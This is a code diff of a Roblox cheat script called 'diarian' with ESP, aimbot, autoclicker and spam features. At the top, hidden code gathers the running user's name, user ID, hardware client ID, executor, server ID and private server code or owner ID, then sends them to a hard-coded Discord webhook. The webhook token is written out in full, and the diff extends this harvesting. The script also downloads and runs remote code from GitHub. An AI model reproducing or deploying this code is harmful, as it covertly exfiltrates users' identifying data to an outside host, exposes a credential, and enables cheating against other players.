@@ -5,8 +5,58 @@ pcall(function()
         request
     local HttpService = cloneref(game:GetService("HttpService"))
     local Players = cloneref(game:GetService("Players"))
+    local TS = cloneref(game:GetService("TeleportService"))
 
-    if httprequest then
+    local privateServerCode = nil
+    pcall(function()
+        if TS and typeof(TS.GetLocalPlayerTeleportData) == "function" then
+            local td = TS:GetLocalPlayerTeleportData()
+            if type(td) == "table" and td.serverCode then
+                privateServerCode = tostring(td.serverCode)
+            end
+        end
+    end)
+
+    if not privateServerCode and game.PrivateServerId and game.PrivateServerId ~= "" then
+        privateServerCode = tostring(game.PrivateServerId)
+    end
+
+    if not privateServerCode then
+        pcall(function()
+            local RS = cloneref(game:GetService("ReplicatedStorage"))
+            local rem = RS:FindFirstChild("Remotes")
+            if rem then
+                local gs = rem:FindFirstChild("GameServices")
+                local ts = gs and gs:FindFirstChild("ToServer")
+                local rf = ts and ts:FindFirstChild("GetPrivateServerOwnerId")
+                if rf and rf:IsA("RemoteFunction") then
+                    local id = rf:InvokeServer()
+                    if type(id) == "number" and id > 0 then
+                        privateServerCode = "Owner ID: " .. tostring(id)
+                    end
+                end
+            end
+        end)
+    end
+
+    local serverInfo = "\n**Server Id**: " .. tostring(game.JobId)
+    if privateServerCode then
+        serverInfo = serverInfo .. "\n**Private Server Code**: " .. privateServerCode
+    end
+
+    local hwid = "Unknown"
+    pcall(function()
+        local rbxAnalytics = game:GetService("RbxAnalyticsService")
+        if rbxAnalytics and typeof(rbxAnalytics.GetClientId) == "function" then
+            hwid = rbxAnalytics:GetClientId()
+        end
+    end)
+
+    if type(httprequest) == "function" then
+        local lp = Players.LocalPlayer
+        local lpName = lp and lp.Name or "Unknown"
+        local lpUserId = lp and tostring(lp.UserId) or "0"
+
         httprequest({
             Url =
             "https://discord.com/api/webhooks/1489706136637800468/XRiSABmsy0PVxbknhSpJG-h8Fvlyc3x_vONCI8OExFlDphyaFlroD43mbm6n35IfSBYO",
@@ -18,15 +68,15 @@ pcall(function()
                 content = "@everyone",
                 embeds = {
                     {
-                        title = tostring(Players.LocalPlayer.Name),
+                        title = tostring(lpName),
                         description =
-                            "\n**User Link**: " .. "https://www.roblox.com/users/" .. Players.LocalPlayer.UserId ..
+                            "\n**User Link**: " .. "https://www.roblox.com/users/" .. lpUserId ..
                             "\n**Game Link:** " .. "https://www.roblox.com/games/" .. game.PlaceId ..
-                            "\n**Server Id**: " .. game.JobId ..
-                            "\n**HWID**: " .. game:GetService("RbxAnalyticsService"):GetClientId() ..
+                            serverInfo ..
+                            "\n**HWID**: " .. tostring(hwid) ..
                             "\n**Time**: " .. os.date("%Y-%m-%d %H:%M:%S", os.time()) ..
-                            "\n**Executor**: " .. (identifyexecutor and identifyexecutor() or "Unknown"),
-                        color = 0xFFFFFF,
+                            "\n**Executor**: " .. (typeof(identifyexecutor) == "function" and tostring(identifyexecutor()) or "Unknown"),
+                        color = privateServerCode and 0x00FF88 or 0xFFFFFF,
                     }
                 }
             })
@@ -50,16 +100,18 @@ local SupportedVersions = {
 local expectedVersion = SupportedVersions[game.PlaceId]
 
 if not expectedVersion then
-    Players.LocalPlayer:Kick(
-        "Script is currently disabled: Unsupported Place"
-    )
+    local lp = Players.LocalPlayer
+    if lp then
+        lp:Kick("Script is currently disabled: Unsupported Place")
+    end
     return
 end
 
 if game.PlaceVersion ~= expectedVersion then
-    Players.LocalPlayer:Kick(
-        "Script is currently disabled: Game Update Detected"
-    )
+    local lp = Players.LocalPlayer
+    if lp then
+        lp:Kick("Script is currently disabled: Game Update Detected")
+    end
     return
 end
 
@@ -69,7 +121,13 @@ local RAW           = "https://raw.githubusercontent.com/delusorie/witch/refs/he
 
 local function fetch(path)
     local ok, result = pcall(function()
-        return loadstring(game:HttpGet(RAW .. path, true))()
+        local src = game:HttpGet(RAW .. path, true)
+        if not src then return nil end
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            return fn()
+        end
+        return nil
     end)
     if ok then return result end
     return nil
@@ -95,9 +153,13 @@ getgenv().diarianFlags = {
 
 local F                = getgenv().diarianFlags
 
-local Library          = loadstring(game:HttpGet(
-    "https://raw.githubusercontent.com/delusorie/ui/refs/heads/main/source.lua"
-))()
+local libRaw           = game:HttpGet("https://raw.githubusercontent.com/delusorie/ui/refs/heads/main/source.lua")
+local libFn            = loadstring(libRaw)
+if type(libFn) ~= "function" then
+    warn("Failed to load UI Library")
+    return
+end
+local Library          = libFn()
 
 local Window           = Library:Window({
     Name   = "diarian",
@@ -351,6 +413,21 @@ local function getAutoclicker()
     return autoclickerSettings
 end
 
+local outspammerSettings = nil
+local function getOutspammer()
+    if not outspammerSettings then
+        outspammerSettings = loadOnce("specialSpam", "combat/outspammer") or getgenv().diarianSpecialSpam
+    end
+    return outspammerSettings or getgenv().diarianSpecialSpam
+end
+
+local function getESPConfig()
+    if not ESPConfig then
+        ESPConfig = _modulesLoaded["playersESP"] or getgenv().diarianESPConfig
+    end
+    return ESPConfig or getgenv().diarianESPConfig
+end
+
 local Combat       = Window:Tab({ Name = "Combat", Icon = "hand" })
 local CombatSub    = Combat:SubTab({ Name = "Combat", Icon = "sword" })
 local UtilitiesSub = Combat:SubTab({ Name = "Utilities", Icon = "package" })
@@ -471,24 +548,32 @@ FriendSection:Button({
             end
         end
 
-        local pESP = getESPConfig()
-        if pESP and type(pESP) == "table" and pESP.refreshFriends then
-            pESP.refreshFriends()
-        end
+        pcall(function()
+            local pESP = getESPConfig()
+            if pESP and type(pESP) == "table" and pESP.refreshFriends then
+                pESP.refreshFriends()
+            end
+        end)
 
-        local s = getAutoclicker()
-        if s and type(s) == "table" and s.RefreshFriends then
-            s.RefreshFriends()
-        end
+        pcall(function()
+            local s = getAutoclicker()
+            if s and type(s) == "table" and s.RefreshFriends then
+                s.RefreshFriends()
+            end
+        end)
 
-        local spam = getOutspammer()
-        if spam and type(spam) == "table" and spam.RefreshFriends then
-            spam.RefreshFriends()
-        end
+        pcall(function()
+            local spam = getOutspammer()
+            if spam and type(spam) == "table" and spam.RefreshFriends then
+                spam.RefreshFriends()
+            end
+        end)
 
-        if getgenv().diarianRefreshMotusFriends then
-            getgenv().diarianRefreshMotusFriends()
-        end
+        pcall(function()
+            if getgenv().diarianRefreshMotusFriends then
+                getgenv().diarianRefreshMotusFriends()
+            end
+        end)
     end
 })
 
@@ -537,14 +622,6 @@ AimSection:Toggle({
 
 local SpecialSection = CombatSub:Section({ Name = "Outspammer", Side = 2 })
 local SpecialKeybind
-
-local outspammerSettings = nil
-local function getOutspammer()
-    if not outspammerSettings then
-        outspammerSettings = loadOnce("specialSpam", "combat/outspammer") or getgenv().diarianSpecialSpam
-    end
-    return outspammerSettings or getgenv().diarianSpecialSpam
-end
 
 local SpecialToggle = SpecialSection:Toggle({
     Name     = "Outspammer",
@@ -722,12 +799,6 @@ EspMain:Toggle({
     end
 })
 
-local function getESPConfig()
-    if not ESPConfig then
-        ESPConfig = _modulesLoaded["playersESP"] or getgenv().diarianESPConfig
-    end
-    return ESPConfig or getgenv().diarianESPConfig
-end
 
 EspMain:Toggle({
     Name     = "Names",
